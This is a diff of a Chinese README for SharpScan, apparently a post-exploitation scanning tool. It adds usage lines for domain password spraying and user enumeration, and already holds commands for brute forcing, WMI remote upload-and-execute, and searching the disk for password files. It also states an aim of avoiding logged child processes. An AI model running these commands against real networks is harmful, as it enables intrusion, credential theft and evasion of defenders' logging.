@@ -38,7 +38,7 @@
 
 - 体积较小(目前800kb)、传输快、自动化扫描+内网信息收集一条龙
 
-- 尽量遵循OPSEC原则，不创建额外子进程(不使用net.exe、wmi.exe）,不使用reg进程操作注册表
+- 尽量遵循OPSEC原则，不创建net.exe、wmi.exe、reg.exe等额外的子进程操，减少日志记录
 
 
 ## 2. 主要功能
@@ -48,15 +48,15 @@
 
 - 支持NetBios(默认137端口)、SMB(默认445端口)和WMI(默认135端口)服务快速探测
 - 高危漏洞扫描：Eternal Blue(ms17010)、SMBGhost(CVE-2020-0796)、ZeroLogon（CVE-2020-1472）
-- Webtitle探测，指纹识别常见CMS、OA框架等
-- 各类服务弱口令爆破、账号密码枚举(SSH、SMB、RDP、FTP)，SSH命令执行
-- 探测当前主机.NET版本、操作系统版本信息、杀毒软件/内网设备（AV/EDR/XDR）查询等
+- Webtitle探测，指纹识别常见CMS、OA框架
+- 各类服务弱口令爆破、账号密码爆破(SSH、SMB、RDP、FTP)，SSH命令执行
+- 探测当前主机.NET版本、操作系统版本信息、杀毒软件/内网设备（AV/EDR/XDR）查询
 - 导出本地RDP登录日志(Rdp端口、Mstsc缓存、Cmdkey缓存、登录成功、失败日志)
-- 判断是否在域内、定位域控IP、信息收集域控的FQDN、域管理员组、域企业管理员组、LDAP查询、域内用户枚举，密码喷洒等
+- 判断是否在域内、定位域控IP、信息收集域控的FQDN、域管理员组、域企业管理员组、LDAP查询、域内用户名枚举，密码喷洒（全自动化）
 - 全盘文件搜索，关键字匹配，与Everything的功能相似，适合全盘检索密码本（静默检索、不消耗内存）
-- 携带一个Socks5代理服务器，支持账号密码验证、支持Tcp端口复用
+- 携带一个Socks5代理服务器，支持账号密码验证、支持Tcp/IP端口复用
 - 通过Sharpwmi进行内网横向移动，支持文件上传、命令执行（文件上传大小不超过512kb）
-- 导出扫描结果
+- 将扫描结果导出为txt、md文档
 
 
 
@@ -83,8 +83,9 @@ Options:
       --pw, --password=VALUE Password for authentication
       --uf, --ufile=VALUE    Username file for authentication
       --pwf, --pwdfile=VALUE Password file for authentication
-  -m, --mode=VALUE           mode(e.g. ssh/smb/rdp/ftp/wmiexec)
-  -f, --func=VALUE           The function name(cmd/upload/uploadexec)
+  -m, --mode=VALUE           Mode(e.g. ssh/smb/rdp/ftp/wmiexec/dcom/mysql/mssql/
+                               userenum/passwordspray)
+  -f, --func=VALUE           wmiexc function(cmd/psh/upload/uploadexec)
   -c, --command=VALUE        Command Execution
   -d, --delay=VALUE          Scan delay(ms),Defalt:10ms
   -t, --thread=VALUE         Maximum num of concurrent scans,Defalt:600
@@ -101,8 +102,8 @@ Options:
 Example:
   SharpScan.exe -help
   SharpScan.exe -h 192.168.1.1/24
+  SharpScan.exe -h C:\ip.txt
   SharpScan.exe -h 192.168.1.1,192.168.1.3,192.168.1.4
-  SharpScan.exe -h C:\\ip.txt
   SharpScan.exe -h 192.168.1.107 -p 100-1024
 ```
 
@@ -143,10 +144,19 @@ SharpScan.exe -h 192.168.244.1/24 -m ssh -u root -pw a -c "uname-a"   (ssh命令
 SharpScan.exe -h 192.168.244.1.3 -m wmiexec -f cmd -c "ls C:\\Windows"  (调用WMI远程执行命令，通过注册表传递数据)
 SharpScan.exe -h 192.168.244.1.3 -m wmiexec -func upload -l C:\a.exe -r C:\\Windows\a.exe    (上传文件到远程主机，-l是本地文件路径，-r是上传到远程主机的文件路径)
 SharpScan.exe -h 192.168.244.1.3 -m wmiexec -func uploadexec -l C:\a.exe -r C:\\Windows\a.exe (上传文件到远程主机并且执行文件)
-SharpScan.exe -s "pass.txt"                                           (全盘静默检索pass.txt)
-SharpScan.exe -socks5 8000 -u test -pw 1234                         (Socks5:8000，用户名:test，密码:1234)
+SharpScan.exe -h 192.168.244.1.3 -m userenum -uf user.txt                   (域内枚举用户名)
+SharpScan.exe -h 192.168.244.1.3 -m passwordspray -uf user.txt -pw abc123$% (域内密码喷洒)
+SharpScan.exe -h 192.168.244.1.3 -m passwordspray -uf user.txt -pwf pass.txt(域内密码喷洒)
+SharpScan.exe -s "pass.txt"                                            (全盘静默检索pass.txt)
+SharpScan.exe -socks5 8000 -u test -pw 1234                            (Socks5:8000，用户名:test，密码:1234)
 SharpScan.exe -h 192.168.244.1/24 -o output.txt                        (将扫描结果导出到output.txt)
 ```
+
+
+
+
+
+
 
 
 
@@ -233,18 +243,6 @@ SharpScan.exe -h 192.168.244.1/24 -m ssh -uf user.txt -pwf pass.txt
 ![image-20240801131225528](Image/image-20240801131225528.png)
 
 ![image-20240801131239111](Image/image-20240801131239111.png)
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
